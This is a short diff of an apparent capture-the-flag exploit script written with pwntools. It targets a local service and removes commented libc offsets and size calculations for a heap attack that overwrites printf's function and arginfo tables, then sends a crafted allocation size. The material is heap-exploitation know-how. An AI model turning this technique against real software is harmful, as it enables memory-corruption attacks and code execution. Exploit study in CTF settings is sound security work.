@@ -5,14 +5,7 @@ from pwn import *
 #pause()
 p = remote("0.0.0.0",10001)
 context.log_level='debug'
-#define MAIN_ARENA       0x3ebc40
-#define MAIN_ARENA_DELTA 0x60
-#define GLOBAL_MAX_FAST  0x3ed940
-#define PRINTF_FUNCTABLE 0x3f0738
-#define PRINTF_ARGINFO   0x3ec870
-#ARGTABLE_Size = (0x3ec870-0x3ebc40)*2 - 0x10 = 0x1850
-#FUNCTABLE_Size = (0x3f0738-0x3ebc40)*2 - 0x10 = 0x95e0
-# use python to calculate
+
 
 p.sendlineafter("What size of a pig you want?\n",str(0x1850)) 
 
